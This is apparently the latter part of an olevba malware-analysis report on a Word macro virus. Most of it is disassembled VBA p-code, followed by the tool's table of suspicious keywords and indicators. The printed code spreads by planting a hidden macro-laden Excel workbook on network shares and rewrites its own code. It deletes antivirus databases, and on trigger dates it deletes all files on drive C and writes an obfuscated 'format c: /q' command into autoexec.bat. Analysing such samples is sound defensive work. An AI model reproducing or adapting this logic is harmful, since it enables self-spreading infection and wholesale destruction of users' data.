' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St par 
' Line #228:
' 	Wend 
' Line #229:
' 	Ld parol 
' 	Ld par 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St parol 
' Line #230:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #231:
' 	Ld wdAllowOnlyComments 
' 	ParamNamed TypeOf 
' 	Ld parol 
' 	ParamNamed Password 
' 	Ld ThisDocument 
' 	ArgsMemCall Protect 0x0002 
' Line #232:
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St lonvis 
' Line #233:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld lonvis 
' 	For 
' Line #234:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St prov 
' Line #235:
' 	Ld prov 
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0009 "'Password"
' 	Eq 
' 	IfBlock 
' Line #236:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #237:
' 	Ld i 
' 	LitStr 0x000A "'Password="
' 	Ld parol 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #238:
' 	EndIfBlock 
' Line #239:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #240:
' 	Ld ThisDocument 
' 	ArgsMemCall Save 0x0000 
' Line #241:
' 	EndIfBlock 
' Line #242:
' 	QuoteRem 0x0000 0x0039 "�à¨ § ªàëâ¨¨ ¯¨è¥¬ ª®¤ ¢® ¢á¥ à ááè à¥­ë¥ à¥áãàáë ¢ á¥âª¥"
' Line #243:
' 	QuoteRem 0x0001 0x0044 "�à®¢¥àï¥¬ ­ «¨ç¨¥ ¢à¥¬¥­­®£® ä ©«  á®§¤ ­­®£® ¯à¨ ®âªàëâ¨¨ ¤®ªã¬¥­â "
' Line #244:
' 	LitStr 0x0000 ""
' 	St sss 
' Line #245:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x01F4 
' 	VarDefn komp
' 	VarDefn wrm (As String)
' Line #246:
' 	Dim 
' 	VarDefn KompCount (As Integer)
' Line #247:
' 	LitDI2 0x0001 
' 	St KompCount 
' Line #248:
' 	LitStr 0x0000 ""
' 	St wrm 
' Line #249:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #250:
' 	LitStr 0x0007 "net.tmp"
' 	MemStWith FileName 
' Line #251:
' 	LitStr 0x000A "C:\windows"
' 	MemStWith LookIn 
' Line #252:
' 	ArgsMemCallWith Execute 0x0000 
' Line #253:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #254:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St sss 
' Line #255:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #256:
' 	EndWith 
' Line #257:
' 	Ld sss 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #258:
' 	QuoteRem 0x0000 0x0020 "‘ç¨âë¢ ¥¬ ¢à¥¬¥­­ë© ä ©«¢ ¬ áá¨¢"
' Line #259:
' 	LitStr 0x0012 "c:\windows\net.tmp"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #260:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #261:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sharp 
' 	ArgsLd Input$ 0x0002 
' 	St wrm 
' Line #262:
' 	Ld wrm 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	Ld KompCount 
' 	LitDI2 0x01F4 
' 	Le 
' 	And 
' 	IfBlock 
' Line #263:
' 	Ld wrm 
' 	Ld KompCount 
' 	ArgsSt komp 0x0001 
' Line #264:
' 	Ld wrm 
' 	LitStr 0x0001 " "
' 	Ne 
' 	DoWhile 
' Line #265:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sharp 
' 	ArgsLd Input$ 0x0002 
' 	St wrm 
' Line #266:
' 	Ld wrm 
' 	LitStr 0x0001 " "
' 	Ne 
' 	IfBlock 
' Line #267:
' 	Ld KompCount 
' 	ArgsLd komp 0x0001 
' 	Ld wrm 
' 	Add 
' 	Ld KompCount 
' 	ArgsSt komp 0x0001 
' Line #268:
' 	EndIfBlock 
' Line #269:
' 	Loop 
' Line #270:
' 	Ld KompCount 
' 	LitDI2 0x0001 
' 	Add 
' 	St KompCount 
' Line #271:
' 	EndIfBlock 
' Line #272:
' 	Loop 
' Line #273:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #274:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x01F4 
' 	For 
' Line #275:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #276:
' 	Ld i 
' 	ArgsLd komp 0x0001 
' 	LitStr 0x0003 "\c\"
' 	Add 
' 	Ld xlpath 
' 	LitDI2 0x0004 
' 	Ld xlpath 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St sing 
' Line #277:
' 	LitStr 0x0000 ""
' 	St nax 
' Line #278:
' 	Ld sing 
' 	LitStr 0x0008 "\vrm.tmp"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #279:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "1"
' 	PrintItemNL 
' Line #280:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #281:
' 	Ld sing 
' 	LitStr 0x0008 "\vrm.tmp"
' 	Add 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #282:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld i 
' 	ArgsLd komp 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #283:
' 	SetStmt 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set exl 
' Line #284:
' 	Ld exl 
' 	ArgsMemCall Run 0x0000 
' Line #285:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #286:
' 	Ld sing 
' 	MemStWith LookIn 
' Line #287:
' 	LitStr 0x000E "Salamandra.xls"
' 	MemStWith FileName 
' Line #288:
' 	ArgsMemCallWith Execute 0x0000 
' Line #289:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St nax 
' Line #290:
' 	EndWith 
' Line #291:
' 	QuoteRem 0x0000 0x0096 "�¨è¥¬ ª®¤ ¢ íªá¥«ì ­  ­ ©¤¥­ë© à áè à¥­­ë© à¥áãàá (à ¡®â  ª®¤  § ¢¨á¨â ®â ¬­®£¨å "­®", â ª çâ® à á¯à®áâà ­¥­¨¥ ¯® á¥âª¥ ç¨áâ® íª¯¥à¥¬¥­â «ì­®¥ ¤¥â¨é¥)"
' Line #292:
' 	Ld nax 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #293:
' 	Ld exl 
' 	MemLd Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #294:
' 	LitDI2 0x0001 
' 	Ld vis 
' 	LitDI2 0x0001 
' 	Ld exl 
' 	MemLd ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #295:
' 	Ld sing 
' 	LitStr 0x000F "\Salamandra.xls"
' 	Add 
' 	Paren 
' 	Ld exl 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #296:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #297:
' 	Ld j 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #298:
' 	Ld j 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #299:
' 	EndIfBlock 
' Line #300:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #301:
' 	LitDI2 0x0003 
' 	LitStr 0x003D "Private Sub Workbook_WindowActivate(ByVal Wn As Excel.Window)"
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #302:
' 	LitDI2 0x0004 
' 	LitStr 0x0006 " a = 8"
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #303:
' 	LitDI2 0x0005 
' 	LitStr 0x0004 " Nod"
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #304:
' 	LitDI2 0x0006 
' 	LitStr 0x0007 "End Sub"
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #305:
' 	QuoteRem 0x0000 0x0023 "¤¥« ¥¬ § ¯¨áë¢ ¥¬ãî ª­¨£ã ­¥¢¨¤¨¬®©"
' Line #306:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld exl 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #307:
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #308:
' 	EndIfBlock 
' Line #309:
' 	Ld exl 
' 	ArgsMemCall Quit 0x0000 
' Line #310:
' 	EndIfBlock 
' Line #311:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #312:
' 	EndIfBlock 
' Line #313:
' 	QuoteRem 0x0000 0x0030 "‚ª«îç ¥¬ äã­ªæ¨î ã­¨çâ®¦¥­¨ï (¥á«¨ á®¢¯ «  ¤ â )"
' Line #314:
' 	LitStr 0x0000 ""
' 	St nax 
' Line #315:
' 	LitStr 0x0000 ""
' 	St xon 
' Line #316:
' 	QuoteRem 0x0000 0x0019 "�à®¢¥àª  ­   "á¢®©-çã¦®©""
' Line #317:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #318:
' 	LitStr 0x000A "c:\windows"
' 	MemStWith LookIn 
' Line #319:
' 	LitStr 0x000B "Salamon.srg"
' 	MemStWith FileName 
' Line #320:
' 	ArgsMemCallWith Execute 0x0000 
' Line #321:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St nax 
' Line #322:
' 	EndWith 
' Line #323:
' 	QuoteRem 0x0000 0x0015 "…á«¨ çã¦®©, â® ª¨«ïâì"
' Line #324:
' 	Ld nax 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #325:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #326:
' 	LitStr 0x000A "c:\windows"
' 	MemStWith LookIn 
' Line #327:
' 	LitStr 0x0007 "avp.kll"
' 	MemStWith FileName 
' Line #328:
' 	ArgsMemCallWith Execute 0x0000 
' Line #329:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St xon 
' Line #330:
' 	EndWith 
' Line #331:
' 	Ld xon 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #332:
' 	LitStr 0x0012 "c:\windows\avp.kll"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #333:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Date 
' 	PrintItemNL 
' Line #334:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #335:
' 	QuoteRem 0x0000 0x005D "„«ï â®£® çâ®¡ë áà ¡®â «® ä®à¬ â¨à®¢ ­¨¥ ¢¨­â  ¨§  ¢â®§ ¯ãáª , ¥¦¥¤­¥¢­®e ã¡¨¢ ¥¬ €‚�è­ë¥ ¡ §ë"
' Line #336:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #337:
' 	ArgsMemCallWith NewSearch 0x0000 
' Line #338:
' 	LitStr 0x0003 "C:\"
' 	MemStWith LookIn 
' Line #339:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #340:
' 	LitStr 0x0005 "*.avc"
' 	MemStWith FileName 
' Line #341:
' 	LitVarSpecial (False)
' 	MemStWith MatchTextExactly 
' Line #342:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #343:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #344:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #345:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #346:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #347:
' 	EndIfBlock 
' Line #348:
' 	EndWith 
' Line #349:
' 	ElseBlock 
' Line #350:
' 	LitStr 0x0012 "c:\windows\avp.kll"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #351:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Sharp 
' 	ArgsLd Input$ 0x0002 
' 	St mmm 
' Line #352:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #353:
' 	Ld mmm 
' 	Ld Date 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	Ne 
' 	IfBlock 
' Line #354:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #355:
' 	ArgsMemCallWith NewSearch 0x0000 
' Line #356:
' 	LitStr 0x0003 "C:\"
' 	MemStWith LookIn 
' Line #357:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #358:
' 	LitStr 0x0005 "*.avc"
' 	MemStWith FileName 
' Line #359:
' 	LitVarSpecial (False)
' 	MemStWith MatchTextExactly 
' Line #360:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #361:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #362:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #363:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #364:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #365:
' 	EndIfBlock 
' Line #366:
' 	EndWith 
' Line #367:
' 	LitStr 0x0012 "c:\windows\avp.kll"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #368:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Date 
' 	PrintItemNL 
' Line #369:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #370:
' 	EndIfBlock 
' Line #371:
' 	EndIfBlock 
' Line #372:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	And 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #373:
' 	QuoteRem 0x0000 0x003C "‚ ãª § ­­ë¥ ¢ëè¥ ¤ âë ã¡¨âì ¢á¥ ­  ¢¨­â¥, â®«ìª® ¬¥¤«¥­­® :)"
' Line #374:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #375:
' 	ArgsMemCallWith NewSearch 0x0000 
' Line #376:
' 	LitStr 0x0003 "C:\"
' 	MemStWith LookIn 
' Line #377:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #378:
' 	LitStr 0x0005 "*.doc"
' 	MemStWith FileName 
' Line #379:
' 	LitVarSpecial (False)
' 	MemStWith MatchTextExactly 
' Line #380:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #381:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #382:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #383:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #384:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #385:
' 	EndIfBlock 
' Line #386:
' 	EndWith 
' Line #387:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #388:
' 	ArgsMemCallWith NewSearch 0x0000 
' Line #389:
' 	LitStr 0x0003 "C:\"
' 	MemStWith LookIn 
' Line #390:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #391:
' 	LitStr 0x0005 "*.xls"
' 	MemStWith FileName 
' Line #392:
' 	LitVarSpecial (False)
' 	MemStWith MatchTextExactly 
' Line #393:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #394:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #395:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #396:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #397:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #398:
' 	EndIfBlock 
' Line #399:
' 	EndWith 
' Line #400:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #401:
' 	ArgsMemCallWith NewSearch 0x0000 
' Line #402:
' 	LitStr 0x0003 "C:\"
' 	MemStWith LookIn 
' Line #403:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #404:
' 	LitStr 0x0003 "*.*"
' 	MemStWith FileName 
' Line #405:
' 	LitVarSpecial (False)
' 	MemStWith MatchTextExactly 
' Line #406:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #407:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #408:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #409:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #410:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #411:
' 	EndIfBlock 
' Line #412:
' 	EndWith 
' Line #413:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #414:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "e"
' 	LitStr 0x0001 "c"
' 	Add 
' 	LitStr 0x0001 "h"
' 	Add 
' 	LitStr 0x0001 "o"
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	LitStr 0x0001 "y"
' 	Add 
' 	LitStr 0x0001 "|"
' 	Add 
' 	LitStr 0x0001 "f"
' 	Add 
' 	LitStr 0x0001 "o"
' 	Add 
' 	LitStr 0x0001 "r"
' 	Add 
' 	LitStr 0x0001 "m"
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitStr 0x0001 "t"
' 	Add 
' 	LitStr 0x0006 " c: /q"
' 	Add 
' 	PrintItemNL 
' Line #415:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #416:
' 	EndIfBlock 
' Line #417:
' 	EndIfBlock 
' Line #418:
' 	EndIfBlock 
' Line #419:
' 	EndSub 
' Line #420:
' 	QuoteRem 0x0000 0x0018 "Password=JGPRZXZIIFUNZEO"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |net.bat             |Executable file name                         |
|IOC       |net.exe             |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

